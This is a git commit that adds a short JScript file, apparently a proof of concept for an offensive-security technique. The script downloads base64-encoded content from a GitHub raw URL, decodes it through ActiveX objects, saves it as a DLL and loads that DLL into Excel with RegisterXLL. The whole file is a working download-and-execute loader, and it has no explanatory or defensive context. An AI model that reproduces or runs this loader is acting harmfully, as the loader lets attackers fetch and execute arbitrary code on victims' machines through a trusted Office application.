50bc258558500039d71bf8a515d4fb2eccb94230
3gstudent <robertpetersen@outlook.com>
2017-07-20 02:14:35 -0700

    Create ExcelDllLoader(Base64decode).js

---
+++ ExcelDllLoader(Base64decode).js
@@ -0,0 +1,15 @@
+x="c:\\test\\calc.dll";
+h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
+h.Send();
+var enc = new ActiveXObject("System.Text.ASCIIEncoding");
+var length = enc.GetByteCount_2(h.ResponseText);
+var ba = enc.GetBytes_4(h.ResponseText);
+var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+ba = transform.TransformFinalBlock(ba, 0, length);
+s=new ActiveXObject("ADODB.Stream");
+s.Type=1;
+s.Open();
+s.Write(ba);	
+s.SaveToFile(x,2);
+new ActiveXObject("Excel.Application").RegisterXLL(x);
